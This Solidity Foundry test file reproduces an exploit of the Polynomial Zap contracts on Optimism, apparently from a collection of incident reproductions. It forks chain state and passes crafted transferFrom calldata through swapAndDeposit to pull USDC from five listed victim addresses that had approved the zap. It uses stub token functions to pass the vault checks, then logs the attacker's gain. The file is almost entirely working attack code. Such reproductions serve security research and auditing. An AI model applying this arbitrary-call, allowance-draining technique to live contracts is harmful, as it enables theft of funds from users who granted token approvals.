// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo -- Total Lost : ~1.4K USD
// TX : https://app.blocksec.com/explorer/tx/optimism/0x9f34ae044cbbf3f1603769dcd90163add48348dde7e1dda41817991935ebfa2f
// Attacker : https://optimistic.etherscan.io/address/0xcf8396010fb7e651f85a439dd7ebc0c8ab56b3f3
// Attack Contract : https://optimistic.etherscan.io/address/0xf682e302f16c9509ffa133029ccf6de55f4e29a8
// GUY : https://x.com/peckshield/status/1602216000187174912
interface PolynomialZap  {

    function swapAndDeposit(
        address user,
        address token,
        address depositToken,
        address swapTarget,
        address vault,
        uint256 amount,
        bytes memory swapData
    ) external payable ;

}
contract ContractTest is Test {
    IERC20 private constant USDT =
        IERC20(0x94b008aA00579c1307B0EF2c499aD98a8ce58e58);
    IERC20 private constant WETH =
        IERC20(0x4200000000000000000000000000000000000006);
    address vuln=0x00dD464dBA9fC0C20c4cC4D470E8Bf965788C150;
    PolynomialZap zap=PolynomialZap(0xDEEB242E045e5827Edf526399bd13E7fFEba4281);
    PolynomialZap zaps=PolynomialZap(0xB162f01C5BDA7a68292410aaA059E7Ce28D77c82);
    address pool=0x1D751bc1A723AccF1942122ca9aa82d49D08d2AE;
    address victim=0x6467024Ef6247A94c8cf60D50715aE71B8B1dfBf;
    address victim_1=0x59022C79236A0F90bAc80b29357bc1d3e6d227d5;
    address victim_2=0xDa1521c966bc95324E156f4F04B28F2804985da5;
    address victim_3=0xfd47c9Ad54D12Caa895FabCD4f7F4308a5F24161;
    address victim_4=0x316c42Af89b913429DBe4a86f30373172340A821;
    IERC20 USDC = IERC20(0x7F5c764cBc14f9669B88837ca1490cCa17c31607);
    function setUp() public {
        vm.createSelectFork("optimism", 39343642);
    }
    function testExploit() public {
        attack();
    }

    function attack()public {
    bytes memory datas=abi.encodeWithSelector(bytes4(0x23b872dd), address(victim),address(this),USDC.balanceOf(address(victim)));
    bytes memory datas_1=abi.encodeWithSelector(bytes4(0x23b872dd), address(victim_1),address(this),10*1e6);
    bytes memory datas_2=abi.encodeWithSelector(bytes4(0x23b872dd), address(victim_2),address(this),USDC.allowance(address(victim_2),address(zaps)));
    bytes memory datas_3=abi.encodeWithSelector(bytes4(0x23b872dd), address(victim_3),address(this),USDC.allowance(address(victim_3),address(zaps)));
    bytes memory datas_4=abi.encodeWithSelector(bytes4(0x23b872dd), address(victim_4),address(this),USDC.allowance(address(victim_4),address(zaps)));
    zap.swapAndDeposit(address(victim), address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE), address(this), address(USDC), address(this), 0, datas);
    zaps.swapAndDeposit(address(victim_1), address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE), address(this), address(USDC), address(this), 0, datas_1);
    zaps.swapAndDeposit(address(victim_2), address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE), address(this), address(USDC), address(this), 0, datas_2);
    zaps.swapAndDeposit(address(victim_3), address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE), address(this), address(USDC), address(this), 0, datas_3);
    zaps.swapAndDeposit(address(victim_4), address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE), address(this), address(USDC), address(this), 0, datas_4);
    emit log_named_decimal_uint("[End] Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals());

    }
    function balanceOf(address account) public view returns (uint256) {
        return 1;
    }
    function approve(address spender, uint256 amount) public returns (bool) {
        return true;
    }

    function initiateDeposit(address _add,uint256 amount)external{
    }
}
